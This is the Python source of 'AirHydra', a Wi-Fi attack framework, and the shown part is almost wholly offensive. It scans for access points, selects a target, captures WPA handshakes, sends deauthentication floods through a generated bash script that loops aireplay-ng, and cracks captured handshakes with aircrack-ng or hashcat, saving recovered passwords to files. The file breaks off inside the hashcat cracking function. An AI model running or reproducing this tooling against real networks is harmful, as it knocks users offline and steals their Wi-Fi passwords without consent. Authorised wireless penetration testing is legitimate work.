#!/usr/bin/env python3
# ╔══════════════════════════════════════════════╗
# ║         AirHydra — By Lord-Hydra             ║
# ║     Wireless Security Framework (R+B)        ║
# ╚══════════════════════════════════════════════╝

import os, sys, subprocess, time, csv, shutil, signal, threading, glob, json
from collections import defaultdict, deque
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ── Colors ────────────────────────────────────────
R   = "\033[1;31m"
G   = "\033[1;32m"
Y   = "\033[1;33m"
C   = "\033[1;36m"
W   = "\033[1;37m"
M   = "\033[1;35m"
DIM = "\033[2m"
RST = "\033[0m"

# ── Paths ─────────────────────────────────────────
SCRIPT_DIR    = os.path.dirname(os.path.realpath(__file__))
CONFIG_FILE   = os.path.join(SCRIPT_DIR, "config", "system.txt")
CAP_DIR       = os.path.join(SCRIPT_DIR, "captures")
CRACKED_DIR   = os.path.join(SCRIPT_DIR, "captures", "cracked")
TMP_DIR       = os.path.join(SCRIPT_DIR, "tmp")
TMP_SCAN      = os.path.join(TMP_DIR, "scan")
TRIGGER_FILE  = os.path.join(TMP_DIR, "trigger.txt")
DEAUTH_SCRIPT = os.path.join(TMP_DIR, "deauth.sh")
DUMP_SCRIPT   = os.path.join(TMP_DIR, "dump.sh")
READY_FILE    = os.path.join(TMP_DIR, "capture_ready.txt")
BLUE_DIR      = os.path.join(TMP_DIR, "blue")
BLUE_CSV_PREFIX = os.path.join(BLUE_DIR, "blue_scan")

def init_dirs():
    os.makedirs(CAP_DIR,     exist_ok=True)
    os.makedirs(CRACKED_DIR, exist_ok=True)
    os.makedirs(TMP_DIR,     exist_ok=True)
    os.makedirs(BLUE_DIR,    exist_ok=True)

# ── Read system config ────────────────────────────
def load_config():
    if not os.path.exists(CONFIG_FILE):
        print(f"\n  {R}[✗]{RST} Config not found: {CONFIG_FILE}")
        print(f"  {Y}[!]{RST} Please run AirHydra via {W}./AirHydra.sh{RST} to generate config.")
        sys.exit(1)

    cfg = {}
    with open(CONFIG_FILE, "r") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if "=" in line:
                k, v = line.split("=", 1)
                cfg[k.strip()] = v.strip()
    return cfg

# ── Terminal launcher ─────────────────────────────
def launch_terminal(script_path, title, cfg):
    term_name = cfg.get("TERMINAL_NAME", "none")
    term_path = cfg.get("TERMINAL_PATH", "none")
    display   = cfg.get("DISPLAY", ":0")

    env = os.environ.copy()
    env["DISPLAY"] = display

    def _launch(args):
        subprocess.Popen(args, env=env,
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)

    try:
        if term_name == "none" or term_path == "none":
            raise FileNotFoundError("no terminal in config")

        if term_name == "x-terminal-emulator":
            _launch([term_path, "-e", f"bash {script_path}"])
        elif term_name == "exo-open":
            _launch([term_path, "--launch", "TerminalEmulator",
                     "bash", script_path])
        elif term_name == "gnome-terminal":
            _launch([term_path, f"--title={title}", "--", "bash", script_path])
        elif term_name == "xfce4-terminal":
            _launch([term_path, f"--title={title}", "-x", "bash", script_path])
        elif term_name == "konsole":
            _launch([term_path, "--title", title, "-e", f"bash {script_path}"])
        elif term_name in ["kitty", "alacritty"]:
            _launch([term_path, "-e", "bash", script_path])
        elif term_name in ["lxterminal", "mate-terminal", "terminator", "tilix"]:
            _launch([term_path, f"--title={title}", "-e", f"bash {script_path}"])
        elif term_name == "xterm":
            _launch([term_path, "-title", title, "-e", f"bash {script_path}"])
        else:
            _launch([term_path, "-e", f"bash {script_path}"])

        info(f"Opened {W}{title}{RST} via {W}{term_name}{RST}")
        return True

    except Exception as e:
        warn(f"Terminal launch failed ({e}) — running {title} in background.")
        subprocess.Popen(["bash", script_path],
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
        return False

# ── Cap prefix ────────────────────────────────────
def get_cap_prefix(essid, bssid=None):
    safe = "".join(c for c in essid if c.isalnum() or c in "-_")[:20]
    if not safe:
        safe = bssid.replace(":", "") if bssid else "capture"
    for pattern in [f"{safe}-*.cap", f"{safe}-*.csv",
                    f"{safe}-*.kismet.csv", f"{safe}-*.kismet.netxml",
                    f"{safe}-*.log.csv", f"{safe}-*.netxml"]:
        for f in glob.glob(os.path.join(CAP_DIR, pattern)):
            try: os.remove(f)
            except: pass
    return os.path.join(CAP_DIR, safe)

# ── Terminal width + centering ────────────────────
def tw():
    try:
        return os.get_terminal_size().columns
    except:
        return 80

def cprint(text, color="", end="\n"):
    import re
    plain = re.sub(r'\033\[[0-9;]*m', '', text)
    pad = max(0, (tw() - len(plain)) // 2)
    print(" " * pad + color + text + (RST if color else "") , end=end)

def head(text):
    width = min(tw() - 4, 60)
    dash_line = "─" * width
    cprint(dash_line, M)
    cprint(text, M)
    cprint(dash_line, M)
    print()

# ── Banner ────────────────────────────────────────
BANNER_ART = [
    r"  ___    _               _   _               _                ",
    r" / _ \  (_)             | | | |             | |               ",
    r"/ /_\ \  _   _ __       | |_| |  _   _    __| |  _ __    __ _ ",
    r"|  _  | | | | '__|      |  _  | | | | |  / _` | | '__|  / _` |",
    r"| | | | | | | |         | | | | | |_| | | (_| | | |    | (_| |",
    r"\_| |_/ |_| |_|         \_| |_/  \__, |  \__,_| |_|     \__,_|",
    r"                                 __/ |                        ",
    r"                                |___/                         ",
]
TAGLINE = "Wireless Security Framework (Red+Blue) │ Lord-Hydra"

def banner():
    os.system("clear")
    print()
    for line in BANNER_ART:
        cprint(line, R)
    print()
    inner  = f"  {TAGLINE}  "
    box_w  = len(inner) + 2
    pad    = max(0, (tw() - box_w) // 2)
    sp     = " " * pad
    print(f"{sp}╔{'═' * (box_w - 2)}╗")
    print(f"{sp}║{inner}║")
    print(f"{sp}╚{'═' * (box_w - 2)}╝")
    print()

# ── Logging ───────────────────────────────────────
def info(m):  print(f"  {G}[+]{RST} {m}")
def warn(m):  print(f"  {Y}[!]{RST} {m}")
def err(m):   print(f"  {R}[✗]{RST} {m}")
def step(m):  print(f"  {C}[»]{RST} {m}")
def alert(m): print(f"  {R}[⚠]{RST} {m}")

def blink_run(msg, func):
    done  = threading.Event()
    frames = ["   ", ".  ", ".. ", "..."]
    def _blink():
        i = 0
        while not done.is_set():
            print(f"\r  {C}[»]{RST} {msg}{frames[i % len(frames)]}", end="", flush=True)
            i += 1
            time.sleep(0.4)
    t = threading.Thread(target=_blink, daemon=True)
    t.start()
    try:
        result = func()
    finally:
        done.set()
        t.join()
        print(f"\r  {C}[»]{RST} {msg}...   ", flush=True)
    return result

def pause():
    try: input(f"\n  {DIM}Press ENTER to return to menu...{RST}")
    except EOFError: pass

# ── Checks ────────────────────────────────────────
def check_root():
    if os.geteuid() != 0:
        err("Run via ./AirHydra.sh — root required.")
        sys.exit(1)

def check_tools():
    needed = ["airmon-ng", "airodump-ng", "aireplay-ng", "iw", "hashcat", "hcxpcapngtool"]
    missing = [t for t in needed if not shutil.which(t)]
    if missing:
        err(f"Missing critical tools: {', '.join(missing)}")
        err("Run ./AirHydra.sh to install missing dependencies.")
        sys.exit(1)

# ── Monitor mode (shared) ─────────────────────────
def confirm_monitor_iface(iface):
    time.sleep(2)
    result = subprocess.run(["iwconfig"], capture_output=True, text=True)
    mon = iface + "mon"
    if mon in result.stdout:
        info(f"Monitor interface: {W}{mon}{RST}")
        return mon
    if iface in result.stdout and "Monitor" in result.stdout:
        info(f"Monitor interface: {W}{iface}{RST}")
        return iface
    iw = subprocess.run(["iw", "dev"], capture_output=True, text=True)
    current = None
    for line in iw.stdout.splitlines():
        line = line.strip()
        if line.startswith("Interface"):
            current = line.split()[-1]
        if "type monitor" in line and current:
            info(f"Monitor interface: {W}{current}{RST}")
            return current
    warn(f"Could not confirm monitor interface, using {iface}")
    return iface

def start_monitor(iface):
    blink_run("Killing interfering processes", lambda:
        subprocess.run(["airmon-ng", "check", "kill"],
                       capture_output=True, text=True))
    time.sleep(0.5)
    blink_run(f"Starting monitor mode on {iface}", lambda:
        subprocess.run(["airmon-ng", "start", iface],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
    mon_iface = confirm_monitor_iface(iface)
    return mon_iface

def get_driver(iface):
    base = iface[:-3] if iface.endswith("mon") else iface
    result = subprocess.run(["airmon-ng"], capture_output=True, text=True)
    for line in result.stdout.splitlines():
        parts = line.split()
        if len(parts) >= 3 and parts[1] == base:
            return parts[2]
    return None

def restore_interface(iface):
    print()
    if iface.endswith("mon"):
        mon_iface  = iface
        base_iface = iface[:-3]
    else:
        mon_iface  = iface + "mon"
        base_iface = iface
    driver = get_driver(iface)
    check = subprocess.run(["ip", "link", "show", mon_iface],
                           capture_output=True, text=True)
    actual = mon_iface if check.returncode == 0 else base_iface

    def _restore():
        subprocess.run(["ip", "link", "set", actual, "down"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["iwconfig", actual, "mode", "managed"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if actual.endswith("mon"):
            subprocess.run(["ip", "link", "set", actual, "name", base_iface],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", base_iface, "up"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if driver:
            subprocess.run(["modprobe", "-r", driver],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)
            subprocess.run(["modprobe", driver],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)
        subprocess.run(["systemctl", "restart", "NetworkManager"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)

    blink_run(f"Restoring {base_iface}", _restore)
    info(f"{W}{base_iface}{RST} restored.")

# ── Scan & select AP (Red Team & Blue Team) ───────
def scan_and_select(iface, on_select=None):
    for f in glob.glob(f"{TMP_SCAN}-*.csv") + glob.glob(f"{TMP_SCAN}-*.cap"):
        try: os.remove(f)
        except: pass

    head("SCANNING NETWORKS")
    try:
        scan_secs = int(input(f"  {C}Scan duration seconds (15-20 recommended): {RST}").strip())
        if scan_secs < 1: scan_secs = 15
    except (ValueError, EOFError):
        scan_secs = 15

    warn(f"Scanning 2.4GHz + 5GHz for {W}{scan_secs}s{RST}{Y}... please wait.")
    print()

    proc = subprocess.Popen(
        ["airodump-ng", "--band", "abg", "--write", TMP_SCAN,
         "--output-format", "csv", iface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    try:
        for i in range(scan_secs, 0, -1):
            print(f"\r  {C}[»]{RST} Scanning... {W}{i}s{RST} remaining   ", end="", flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    proc.terminate()
    proc.wait()
    time.sleep(1)
    print(f"\r  {G}[+]{RST} Scan complete!                        ")

    csv_file = f"{TMP_SCAN}-01.csv"
    if not os.path.exists(csv_file):
        err("Scan file not found. Is interface in monitor mode?")
        return None

    aps = []
    try:
        with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        ap_section = content.split("\n\n")[0]
        reader = csv.reader(ap_section.splitlines())
        next(reader, None)
        for row in reader:
            if len(row) < 14: continue
            bssid   = row[0].strip()
            channel = row[3].strip()
            enc     = row[5].strip()
            power   = row[8].strip()
            essid   = row[13].strip() or "<hidden>"
            if not bssid or bssid == "BSSID": continue
            aps.append({"num": len(aps)+1, "bssid": bssid,
                        "channel": channel, "enc": enc,
                        "power": power, "essid": essid})
    except Exception as e:
        err(f"Failed to parse scan: {e}")
        return None

    if not aps:
        err("No APs found. Try again or check monitor mode.")
        return None

    print()
    print(f"  {W}{'#':<4} {'BSSID':<20} {'CH':<5} {'ENC':<8} {'PWR':<6} ESSID{RST}")
    print(f"  {DIM}{'─'*65}{RST}")
    for ap in aps:
        try:
            pval = int(ap['power'])
            pcol = G if pval > -60 else (Y if pval > -75 else R)
        except: pcol = W
        print(f"  {C}{ap['num']:<4}{RST}{ap['bssid']:<20} {ap['channel']:<5} "
              f"{ap['enc']:<8} {pcol}{ap['power']:<6}{RST} {W}{ap['essid']}{RST}")
    print()

    while True:
        try:
            choice = input(f"  {C}Select target # (or 0 to cancel): {RST}").strip()
            if choice == "0": return None
            idx = int(choice) - 1
            if 0 <= idx < len(aps):
                t = aps[idx]
                print()
                info(f"Target  : {Y}{t['essid']}{RST}")
                info(f"BSSID   : {Y}{t['bssid']}{RST}")
                info(f"Channel : {Y}{t['channel']}{RST}")
                if on_select:
                    on_select(t['bssid'], t['channel'], t['essid'])
                return t['bssid'], t['channel'], t['essid']
            else:
                warn("Invalid number, try again.")
        except ValueError:
            warn("Enter a number.")

# ── Handshake monitor (Red Team) ──────────────────
_hs_found = False

def monitor_handshake(bssid, cap_file):
    global _hs_found
    _hs_found = False

    def _watch():
        global _hs_found
        while not _hs_found:
            time.sleep(3)
            if not os.path.exists(cap_file):
                continue
            try:
                r = subprocess.run(
                    f"aircrack-ng \"{cap_file}\" 2>/dev/null | grep -i 'handshake'",
                    shell=True, capture_output=True, text=True
                )
                if "handshake" in r.stdout.lower():
                    _hs_found = True
                    print(f"\n\n  {G}{'█'*47}")
                    print(f"  ██   ✅  WPA HANDSHAKE CAPTURED!            ██")
                    print(f"  ██   BSSID : {bssid:<32}██")
                    print(f"  ██   File  : {os.path.basename(cap_file):<32}██")
                    print(f"  {'█'*47}{RST}")
                    print(f"\n  {Y}[!] Press Ctrl+C to stop.{RST}\n")
            except: pass

    threading.Thread(target=_watch, daemon=True).start()

# ══════════════════════════════════════════════════
#  FAST HANDSHAKE CHECKER (caching + parallel)
# ══════════════════════════════════════════════════
HANDSHAKE_CACHE_FILE = os.path.join(TMP_DIR, "handshake_cache.json")
HANDSHAKE_CACHE_TTL = 3600

class HandshakeChecker:
    def __init__(self):
        self.cache = self._load_cache()
        self._save_counter = 0

    def _load_cache(self):
        if os.path.exists(HANDSHAKE_CACHE_FILE):
            try:
                with open(HANDSHAKE_CACHE_FILE, 'r') as f:
                    return json.load(f)
            except:
                pass
        return {}

    def _save_cache(self):
        if len(self.cache) > 500:
            sorted_items = sorted(self.cache.items(),
                                  key=lambda x: x[1].get('timestamp', 0))
            self.cache = dict(sorted_items[-500:])
        with open(HANDSHAKE_CACHE_FILE, 'w') as f:
            json.dump(self.cache, f)

    def _get_file_hash(self, filepath):
        stat = os.stat(filepath)
        return f"{stat.st_size}_{stat.st_mtime_ns}"

    def _check_with_tshark(self, cap_file):
        if not shutil.which('tshark'):
            return self._check_with_aircrack(cap_file)
        cmd = [
            'tshark', '-r', cap_file,
            '-Y', 'wlan.fc.type_subtype == 0x0d',
            '-T', 'fields', '-e', 'frame.number',
            '-c', '1'
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return bool(result.stdout.strip())

    def _check_with_aircrack(self, cap_file):
        r = subprocess.run(
            f"aircrack-ng \"{cap_file}\" 2>/dev/null | grep -i 'handshake'",
            shell=True, capture_output=True, text=True
        )
        return "handshake" in r.stdout.lower()

    def has_handshake(self, cap_file, use_cache=True, reliable=False):
        if reliable:
            return self._check_with_aircrack(cap_file)
        if not use_cache:
            return self._check_with_tshark(cap_file)

        file_hash = self._get_file_hash(cap_file)
        now = time.time()
        if cap_file in self.cache:
            cached = self.cache[cap_file]
            if (cached.get('hash') == file_hash and
                now - cached.get('timestamp', 0) < HANDSHAKE_CACHE_TTL):
                return cached.get('has_handshake', False)

        has_hs = self._check_with_tshark(cap_file)
        self.cache[cap_file] = {
            'hash': file_hash,
            'has_handshake': has_hs,
            'timestamp': now
        }
        self._save_counter += 1
        if self._save_counter % 10 == 0:
            self._save_cache()
        return has_hs

    def check_multiple(self, cap_files, max_workers=4, reliable=False):
        results = {}
        if reliable:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                future_to_file = {
                    executor.submit(self._check_with_aircrack, cap): cap
                    for cap in cap_files
                }
                for future in as_completed(future_to_file):
                    cap_file = future_to_file[future]
                    try:
                        results[cap_file] = future.result()
                    except Exception:
                        results[cap_file] = False
            return results

        uncached = []
        for cap in cap_files:
            if cap in self.cache:
                cached = self.cache[cap]
                if time.time() - cached.get('timestamp', 0) < HANDSHAKE_CACHE_TTL:
                    results[cap] = cached.get('has_handshake', False)
                else:
                    uncached.append(cap)
            else:
                uncached.append(cap)

        if uncached:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                future_to_file = {
                    executor.submit(self._check_with_tshark, cap): cap
                    for cap in uncached
                }
                for future in as_completed(future_to_file):
                    cap_file = future_to_file[future]
                    try:
                        has_hs = future.result()
                        results[cap_file] = has_hs
                        self.cache[cap_file] = {
                            'hash': self._get_file_hash(cap_file),
                            'has_handshake': has_hs,
                            'timestamp': time.time()
                        }
                    except Exception:
                        results[cap_file] = False

        self._save_cache()
        return results

checker = HandshakeChecker()
def has_handshake(cap_file, reliable=False):
    return checker.has_handshake(cap_file, reliable=reliable)

def cleanup_empty_caps():
    caps = sorted([f for f in glob.glob(os.path.join(CAP_DIR, "*.cap")) if os.path.isfile(f)])
    if not caps: return
    fast_results = checker.check_multiple(caps, reliable=False)
    potential_empty = [c for c in caps if not fast_results.get(c, False)]
    if not potential_empty: return
    confirmed_empty = []
    for cap in potential_empty:
        if not has_handshake(cap, reliable=True):
            confirmed_empty.append(cap)
        else:
            checker.cache[cap] = {'hash': checker._get_file_hash(cap), 'has_handshake': True, 'timestamp': time.time()}
    checker._save_cache()
    if not confirmed_empty: return
    print()
    warn(f"Found {W}{len(confirmed_empty)}{RST}{Y} empty cap file(s):")
    for c in confirmed_empty:
        size = os.path.getsize(c)
        print(f"    {DIM}{os.path.basename(c)} ({size//1024}K){RST}")
    print()
    ans = input(f"  {C}Delete these empty cap files? (y/n): {RST}").strip().lower()
    if ans == "y":
        for c in confirmed_empty:
            try:
                os.remove(c)
                base = c.replace("-01.cap", "").replace(".cap", "")
                for ext in ["-01.csv", "-01.kismet.csv", "-01.kismet.netxml", "-01.log.csv"]:
                    f = base + ext
                    if os.path.exists(f): os.remove(f)
            except: pass
            if c in checker.cache: del checker.cache[c]
        checker._save_cache()
        info(f"Deleted {W}{len(confirmed_empty)}{RST} empty file(s).")
    print()

# ── Script writers (Red Team) ─────────────────────
def write_deauth_script():
    banner_raw = r"""
echo "  ___    _               _   _               _                "
echo " / _ \  (_)             | | | |             | |               "
echo "/ /_\ \  _   _ __       | |_| |  _   _    __| |  _ __    __ _ "
echo "|  _  | | | | '__|      |  _  | | | | |  / _` | | '__|  / _` |"
echo "| | | | | | | |         | | | | | |_| | | (_| | | |    | (_| |"
echo "\_| |_/ |_| |_|         \_| |_/  \__, |  \__,_| |_|     \__,_|"
echo "                                 __/ |                       "
echo "                                |___/                        "
"""
    with open(DEAUTH_SCRIPT, "w") as f:
        f.write(f"""#!/bin/bash
clear
echo ""
{banner_raw.strip()}
echo ""
echo "  ╔══════════════════════════════════════════╗"
echo "  ║     AirHydra — Deauth Terminal           ║"
echo "  ╚══════════════════════════════════════════╝"
echo ""
echo "  [*] Waiting for target trigger..."
echo ""

TRIGGER="{TRIGGER_FILE}"

while [ ! -f "$TRIGGER" ]; do
    sleep 0.3
done

BSSID=$(grep "^BSSID=" "$TRIGGER" | cut -d= -f2)
IFACE=$(grep "^IFACE=" "$TRIGGER" | cut -d= -f2)
ESSID=$(grep "^ESSID=" "$TRIGGER" | cut -d= -f2)
CHANNEL=$(grep "^CHANNEL=" "$TRIGGER" | cut -d= -f2)

echo "  [+] Target  : $ESSID"
echo "  [+] BSSID   : $BSSID"
echo "  [+] Channel : $CHANNEL"
echo "  [+] Iface   : $IFACE"
echo ""

echo "  [»] Locking to channel $CHANNEL..."
iw dev "$IFACE" set channel "$CHANNEL" 2>/dev/null
sleep 0.5

echo "  [»] Deauth running... stops when capture is done."
echo ""

while [ -f "$TRIGGER" ]; do
    iw dev "$IFACE" set channel "$CHANNEL" 2>/dev/null
    aireplay-ng --deauth 3 -a "$BSSID" "$IFACE" 2>&1
    sleep 10
done

echo ""
echo "  [+] Capture complete. Deauth stopped."
echo "  Press ENTER to close."
read
""")
    os.chmod(DEAUTH_SCRIPT, 0o755)

def write_dump_script(bssid, channel, cap_prefix, iface, ready_file):
    banner_raw = r"""
echo "  ___    _               _   _               _                "
echo " / _ \  (_)             | | | |             | |               "
echo "/ /_\ \  _   _ __       | |_| |  _   _    __| |  _ __    __ _ "
echo "|  _  | | | | '__|      |  _  | | | | |  / _` | | '__|  / _` |"
echo "| | | | | | | |         | | | | | |_| | | (_| | | |    | (_| |"
echo "\_| |_/ |_| |_|         \_| |_/  \__, |  \__,_| |_|     \__,_|"
echo "                                 __/ |                       "
echo "                                |___/                        "
"""
    with open(DUMP_SCRIPT, "w") as f:
        f.write(f"""#!/bin/bash
clear
echo ""
{banner_raw.strip()}
echo ""
echo "  ╔══════════════════════════════════════════╗"
echo "  ║     AirHydra — Capture Terminal          ║"
echo "  ╚══════════════════════════════════════════╝"
echo ""
echo "  [»] Starting capture..."
echo "  [!] Watch top-right for: WPA handshake"
echo ""

touch "{ready_file}"

airodump-ng --bssid {bssid} -c {channel} --write "{cap_prefix}" {iface}

echo ""
echo "  [+] Capture stopped."
echo "  Press ENTER to close."
read
""")
    os.chmod(DUMP_SCRIPT, 0o755)

def write_trigger(bssid, iface, essid, cap_prefix, channel=""):
    with open(TRIGGER_FILE, "w") as f:
        f.write(f"BSSID={bssid}\nIFACE={iface}\nESSID={essid}\nCAP={cap_prefix}\nCHANNEL={channel}\n")

def remove_trigger():
    try:
        if os.path.exists(TRIGGER_FILE): os.remove(TRIGGER_FILE)
    except: pass

# ══════════════════════════════════════════════════
#  RED TEAM OPTIONS (with "RED TEAM –" prefix)
# ══════════════════════════════════════════════════

def normal_handshake(iface, cfg):
    banner()
    head("RED TEAM – NORMAL HANDSHAKE CAPTURE")
    mon_iface = start_monitor(iface)
    print()
    result = scan_and_select(mon_iface)
    if not result:
        warn("No target selected.")
        restore_interface(mon_iface)
        return
    bssid, channel, essid = result
    cap_prefix = get_cap_prefix(essid, bssid)
    cap_file   = cap_prefix + "-01.cap"
    print()
    step(f"Starting capture on {W}{essid}{RST}...")
    warn(f"Watch for {W}WPA handshake{RST}{Y} in top-right of airodump.")
    warn(f"Press {W}Ctrl+C{RST}{Y} once handshake is captured.\n")
    time.sleep(1)
    dump_proc = subprocess.Popen(
        ["airodump-ng", "--bssid", bssid, "-c", channel, "--write", cap_prefix, mon_iface],
        preexec_fn=lambda: signal.signal(signal.SIGINT, signal.SIG_IGN)
    )
    monitor_handshake(bssid, cap_file)
    try:
        dump_proc.wait()
    except KeyboardInterrupt:
        dump_proc.send_signal(signal.SIGTERM)
        dump_proc.wait()
        time.sleep(1)
    print()
    if os.path.exists(cap_file):
        info(f"Handshake file: {G}{cap_file}{RST}")
    else:
        warn(f"Cap file not found — check manually.")
    info("Auto-restoring interface...")
    restore_interface(mon_iface)

def advanced_handshake(iface, cfg):
    banner()
    head("RED TEAM – ADVANCED HANDSHAKE (AUTO DEAUTH)")
    remove_trigger()
    if os.path.exists(READY_FILE): os.remove(READY_FILE)
    mon_iface = start_monitor(iface)
    print()
    state = {}
    def on_select(bssid, channel, essid):
        cap_prefix = get_cap_prefix(essid, bssid)
        state.update({'bssid': bssid, 'channel': channel, 'essid': essid, 'cap_prefix': cap_prefix, 'cap_file': cap_prefix + "-01.cap"})
        step(f"Locking {W}{mon_iface}{RST} to channel {W}{channel}{RST}...")
        subprocess.run(["iw", "dev", mon_iface, "set", "channel", channel], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(0.5)
        write_dump_script(bssid, channel, cap_prefix, mon_iface, READY_FILE)
        step("Opening capture terminal...")
        launch_terminal(DUMP_SCRIPT, "AirHydra-Capture", cfg)
        step("Waiting for capture to initialize...")
        ready = False
        for _ in range(50):
            if os.path.exists(READY_FILE):
                ready = True
                break
            time.sleep(0.2)
        if not ready:
            warn("Capture may not have started properly. Deauth may miss handshake.")
        else:
            info("Capture terminal ready.")
        write_deauth_script()
        step("Opening deauth terminal...")
        launch_terminal(DEAUTH_SCRIPT, "AirHydra-Deauth", cfg)
        time.sleep(1)
        write_trigger(bssid, mon_iface, essid, cap_prefix, channel)
        info(f"Trigger sent! Deauth attacking {Y}{essid}{RST} [{Y}{bssid}{RST}]")
    result = scan_and_select(mon_iface, on_select=on_select)
    if not result:
        warn("No target selected.")
        remove_trigger()
        if os.path.exists(READY_FILE): os.remove(READY_FILE)
        restore_interface(mon_iface)
        return
    bssid, cap_file = state['bssid'], state['cap_file']
    print()
    info(f"Deauth + Capture terminals running.")
    info(f"Watching for handshake in {W}{os.path.basename(cap_file)}{RST}...")
    warn(f"Press {W}Ctrl+C{RST}{Y} to stop everything.\n")
    monitor_handshake(bssid, cap_file)
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        pass
    remove_trigger()
    if os.path.exists(READY_FILE): os.remove(READY_FILE)
    info("Deauth stopped.")
    time.sleep(1)
    print()
    if os.path.exists(cap_file):
        info(f"Handshake file: {G}{cap_file}{RST}")
    else:
        warn(f"Cap file not found — check manually.")
    info("Auto-restoring interface...")
    restore_interface(mon_iface)

def deauth_attack(iface, cfg):
    banner()
    head("RED TEAM – DEAUTH ATTACK")
    mon_iface = start_monitor(iface)
    print()
    result = scan_and_select(mon_iface)
    if not result:
        warn("No target selected.")
        restore_interface(mon_iface)
        return
    bssid, channel, essid = result
    try:
        ch_int = int(channel)
        if ch_int >= 36:
            print()
            warn(f"{R}⚠️  5GHz channel detected ({channel}) – deauth may not work!{RST}")
            warn(f"{Y}Most WiFi adapters struggle with deauth on 5GHz. Consider using 2.4GHz networks.{RST}")
            print()
    except: pass
    print()
    pkts = input(f"  {W}Deauth packets (0 = continuous, default 20): {RST}").strip()
    if not pkts: pkts = "20"
    print(f"\n  {DIM}Press {RST}{R}Ctrl+C{RST}{DIM} to stop the attack{RST}")
    step(f"Locking {W}{mon_iface}{RST} to channel {W}{channel}{RST}...")
    subprocess.run(["iwconfig", mon_iface, "channel", channel], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(0.5)
    print()
    step(f"Deauthing {Y}{essid}{RST} [{Y}{bssid}{RST}] — {W}{pkts}{RST} packets...")
    print(f"  {DIM}{'─'*45}{RST}\n")
    time.sleep(1)
    try:
        subprocess.run(["aireplay-ng", "--deauth", pkts, "-a", bssid, mon_iface])
    except KeyboardInterrupt:
        pass
    print()
    info("Deauth done.")
    info("Auto-restoring interface...")
    restore_interface(mon_iface)

def pick_cap_file():
    cleanup_empty_caps()
    caps = sorted([f for f in glob.glob(os.path.join(CAP_DIR, "*.cap")) if os.path.isfile(f)])
    if not caps:
        warn(f"No .cap files found in {W}{CAP_DIR}{RST}")
        return None
    results = checker.check_multiple(caps, reliable=False)
    print(f"  {W}{'#':<4} {'FILE':<35} {'SIZE':<10} HANDSHAKE{RST}")
    print(f"  {DIM}{'─'*65}{RST}")
    for i, cap in enumerate(caps, 1):
        size = os.path.getsize(cap)
        size_str = f"{size//1024}K" if size > 1024 else f"{size}B"
        fname = os.path.basename(cap)
        if len(fname) > 35: fname = fname[:32] + "..."
        hs = f"{G}✅{RST}" if results.get(cap, False) else f"{R}✗{RST}"
        print(f"  {C}{i:<4}{RST}{fname:<35} {size_str:<10} {hs}")
    print()
    while True:
        try:
            choice = input(f"  {C}Select .cap # (or 0 to cancel): {RST}").strip()
            if choice == "0": return None
            idx = int(choice) - 1
            if 0 <= idx < len(caps): return caps[idx]
            warn("Invalid number.")
        except ValueError:
            warn("Enter a number.")

def check_gpu_support():
    """Fallback detector for GPU support in Python."""
    if not shutil.which("hashcat"):
        return False
    try:
        import re
        r = subprocess.run(["hashcat", "-I"], capture_output=True, text=True, timeout=5)
        return bool(re.search(r"CUDA|OpenCL|GPU", r.stdout, re.IGNORECASE))
    except:
        return False

def pick_crack_method(cfg):
    gpu_avail = cfg.get("GPU_AVAILABLE")
    if gpu_avail is None:
        gpu_avail = "yes" if check_gpu_support() else "no"
    
    print()
    if gpu_avail == "yes":
        info(f"GPU detected — enabling advanced modes {W}⚡{RST}")
        print(f"  {W}[1]{RST}  Hashcat CPU      {DIM}(-D 1){RST}")
        print(f"  {W}[2]{RST}  Hashcat GPU      {DIM}(-D 2){RST}")
        print(f"  {W}[3]{RST}  Hashcat Hybrid   {DIM}(-D 1,2){RST}")
        valid = ["1", "2", "3"]
    else:
        warn("No compatible GPU found — using CPU mode only")
        print(f"  {W}[1]{RST}  Hashcat CPU      {DIM}(-D 1){RST}")
        valid = ["1"]
    
    print()
    if not shutil.which("hashcat"):
        warn("hashcat not found! Install: sudo apt install hashcat")
        warn("Falling back to aircrack-ng for CPU cracking.")
        return "aircrack", "1"
    
    while True:
        choice = input(f"  {C}Method: {RST}").strip()
        if choice not in valid:
            warn(f"Invalid option. Please select {', '.join(valid)}")
            continue
            
        if choice == "1": return "hashcat", "1"
        if choice == "2": return "hashcat", "2"
        if choice == "3": return "hashcat", "1,2"

def save_cracked_result(cap_file, ssid, password):
    safe = "".join(c for c in ssid if c.isalnum() or c in "-_")[:20] or "unknown"
    out = os.path.join(CRACKED_DIR, f"{safe}_cracked.txt")
    with open(out, "w") as f:
        f.write(f"SSID     : {ssid}\nPassword : {password}\nCAP File : {cap_file}\nTime     : {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    return out

def crack_with_aircrack(cap_file, wordlist):
    print()
    step("Running aircrack-ng...")
    print(f"  {DIM}{'─'*45}{RST}\n")
    r = subprocess.run(["aircrack-ng", cap_file, "-w", wordlist], capture_output=True, text=True)
    print(r.stdout)
    for line in r.stdout.splitlines():
        if "KEY FOUND" in line:
            try: return line.split("[")[1].split("]")[0].strip()
            except: pass
    return None

def crack_with_hashcat(cap_file, wordlist, devices="2"):
    print()
